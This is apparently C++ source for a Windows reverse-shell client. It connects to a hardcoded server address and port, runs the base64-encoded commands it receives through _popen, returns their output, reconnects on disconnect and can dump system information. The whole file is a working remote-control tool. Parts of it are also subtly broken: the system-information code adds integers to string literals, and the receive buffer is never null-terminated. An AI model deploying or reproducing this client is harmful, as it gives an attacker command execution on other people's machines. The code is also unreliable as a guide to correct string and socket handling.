#include <iostream>
#include <string>
#include <stdexcept>
#include <vector>
#include <sstream>
#include <fstream>
#include <ctime>
#include <algorithm>
#include <iterator>
#include <WS2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

using namespace std;

typedef unsigned char uchar;             // Custom Data Type
const string TARGETIP = "192.168.1.6";      // SERVER Ip Address
const int    TARGETPO = 54000;          // SERVER Port Numbe

// Dumping System information
class DUMP_SYSINFO {
private:
	SYSTEM_INFO sysInfo;
public:
	DUMP_SYSINFO() {
		GetSystemInfo(&sysInfo);
	}
	string toString(){
		string rtval = "";
		rtval += "OEM ID: " + sysInfo.dwOemId;
		rtval += "\nNumber of processors: " + sysInfo.dwNumberOfProcessors;
		rtval += "\nPage size: " + sysInfo.dwPageSize;
		rtval += "\nProcessor type: " + sysInfo.dwProcessorType;
		rtval += "\nActive processor mask: " + sysInfo.dwActiveProcessorMask;
		rtval += "\nReserved Memory: " + sysInfo.wReserved;
		rtval += "\nProcessor Architecture: " + sysInfo.wProcessorArchitecture;
		rtval += "\nProcessor Level: " + sysInfo.wProcessorLevel;
		rtval += "\nProcessor Revision: " + sysInfo.wProcessorRevision;
		rtval += "\n";
		return rtval;
	}
};

// Some Extended Methods for String
class STRINGER{
private:
	string b;

public:
	STRINGER(){
		this->b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";//=
	}
	void erase(string &upper, const string lower){
		size_t pos = upper.find(lower);
		if (pos != std::string::npos){
			upper.erase(pos, lower.length());
		}
	}
	template <class Container>
	void split(const std::string& str, Container& cont, char delim = ' '){
		std::stringstream ss(str);
		std::string token;
		while (std::getline(ss, token, delim)) {
			cont.push_back(token);
		}
	}
	string exec(const char* cmd) {
		char buffer[128];
		std::string result = "";
		FILE* pipe = _popen(cmd, "r");
		if (!pipe) throw std::runtime_error("popen() failed!");
		try {
			while (fgets(buffer, sizeof buffer, pipe) != NULL) {
				result += buffer;
			}
		}
		catch (...) {
			_pclose(pipe);
			throw;
		}
		_pclose(pipe);
		return result;
	}
	string base64_encode(const std::string &in){
		std::string out;

		int val = 0, valb = -6;
		for (uchar c : in) {
			val = (val << 8) + c;
			valb += 8;
			while (valb >= 0) {
				out.push_back(b[(val >> valb) & 0x3F]);
				valb -= 6;
			}
		}
		if (valb>-6) out.push_back(b[((val << 8) >> (valb + 8)) & 0x3F]);
		while (out.size() % 4) out.push_back('=');
		return out;
	}
	string base64_decode(const std::string &in){
		std::string out;

		std::vector<int> T(256, -1);
		for (int i = 0; i<64; i++) T[b[i]] = i;

		int val = 0, valb = -8;
		for (uchar c : in) {
			if (T[c] == -1) break;
			val = (val << 6) + T[c];
			valb += 6;
			if (valb >= 0) {
				out.push_back(char((val >> valb) & 0xFF));
				valb -= 8;
			}
		}
		return out;
	}
};

class PREDECESSOR{
private:
	string ex_error;

protected:
	SOCKET connection_sock;
	int    connection_conn;

public:
	PREDECESSOR(){
		ex_error = "Peaceful Exit";
	}
	void setError(const string val){
		ex_error = val;
	}
	string getError() const{
		return ex_error;
	}
	bool checkWSocket(const int val){
		bool rtval = true;
		if (val != 0){
			setError("Not able to Initialize Window Socket");
			rtval = false;
		}
		return rtval;
	}
	bool checkSSocket(const SOCKET val){
		bool rtval = true;
		if (val == INVALID_SOCKET){
			setError("Wasn't Able to Create Socket Instance!");
			rtval = false;
		}
		return rtval;
	}
	bool checkSConnection(const int val){
		bool rtval = true;
		if (val == SOCKET_ERROR){
			setError("Wasn't able to establish a connection with Server!");
			rtval = false;
		}
		return rtval;
	}
	bool checkRError(const int val){
		bool rtval = false;
		if (val == SOCKET_ERROR){
			setError("Error While Receiving Data!");
			rtval = true;
		}
		return rtval;
	}
	bool checkSError(const int val){
		bool rtval = false;
		if (val == SOCKET_ERROR){
			setError("Error While Sending Data!");
			rtval = true;
		}
		return rtval;
	}
	SOCKET init(){
		SOCKET rtval = socket(AF_INET, SOCK_STREAM, 0);
		return rtval;
	}
	void close(const SOCKET toclose){
		closesocket(toclose);
		WSACleanup();
	}
};

class CLIENT: public PREDECESSOR{
private:
	string sv_address;
	int sv_port;

	// Ip Structure
	sockaddr_in client_ip;

	// Extended Stringer
	STRINGER stringer;

public:
	CLIENT(const string vala, const int valb){
		sv_address = vala;
		sv_port    = valb;
	}
	void setClient(){
		client_ip.sin_family = AF_INET;
		client_ip.sin_port = htons(sv_port);
		inet_pton(AF_INET, sv_address.c_str(), &client_ip.sin_addr);
	}
	void clean(string &data){
		stringer.erase(data, "abigbreakhere");
	}
	string receive(){
		char buf[4096];
		int recv_conn;
		string converter = "";
		string byter = "";

		do{
			recv_conn = recv(connection_sock, buf, 4096, 0);
			if (recv_conn == 0){ // Connection Closed by Server
				converter = "closed";
				break;
			}else if (this->checkRError(recv_conn)){
				converter = "shutdown";
				break;
			}else{
				byter = buf;
				converter += byter;
			}
		} while (byter.find("abigbreakhere") == string::npos);
		// Run the loop as long as it doesn't have abigbreakhere

		return converter;
	}
	bool senddata(string tosend){
		bool rtval = true;
		tosend = stringer.base64_encode(tosend) + "abigbreakhere";
		int send_conn = send(connection_sock, tosend.c_str(), tosend.size() + 1, 0);
		if (!(this->checkSError(send_conn))){
			rtval = false;
		}
		return rtval;
	}
	void execute(string command){
		string toexecute;
		string output;
		if (command.find(":") != string::npos){  // Command Prompt
			vector<string> values;
			stringer.split(command, values, ':');
			if (values.size() >= 2){
				if (stringer.base64_decode(values[0]) == "true"){
					toexecute = stringer.base64_decode(values[1]);
					output    = stringer.exec(toexecute.c_str());
					cout << "Command Received: " << toexecute << endl;
					senddata(output);
				}else{
					cout << "Received False in Command Prompt" << endl;
				}
			}
		}else{                                   // Silly Prompt
			toexecute = stringer.base64_decode(command);
			cout << "Command Received: " << toexecute << endl;
			if (toexecute == "sysinfo") {
				DUMP_SYSINFO informater;
				senddata(informater.toString());
			}
		}
	}
	bool launch(){
		string data;
		bool rtval = false;
		cout << "Interface Launched!" << endl;
		while (true){
			data = receive();
			cout << "Received this: " << endl;
			if (data == "closed"){
				rtval = false;
				break;
			}else if (data == "shutdown"){
				rtval = false;
				break;
			}else{
				clean(data);
				execute(data);
			}
		}
		return rtval;
	}
	void engage(){
		// Initialize WinSock
		bool stopper;
		WSAData data;
		WORD ver = MAKEWORD(2, 2);
		int ws_result = WSAStartup(ver, &data);

		if (this->checkWSocket(ws_result)){
			connection_sock = this->init();
			if (this->checkSSocket(connection_sock)){
				// Set Client
				setClient();

				// Connect to server
				while (true){
					cout << "Establishing!" << endl;
					connection_conn = connect(connection_sock, (sockaddr*)&client_ip, sizeof(client_ip));
					if (this->checkSConnection(connection_conn)){
						stopper = this->launch();
						break;
					}
				}
				close(connection_sock);
				if (!stopper) {
					this->engage();
				}
			}
		}
	}
};

int main(){
	CLIENT SillyClient(TARGETIP, TARGETPO);
	SillyClient.engage();
	cout << SillyClient.getError() << endl;
	system("pause");
}
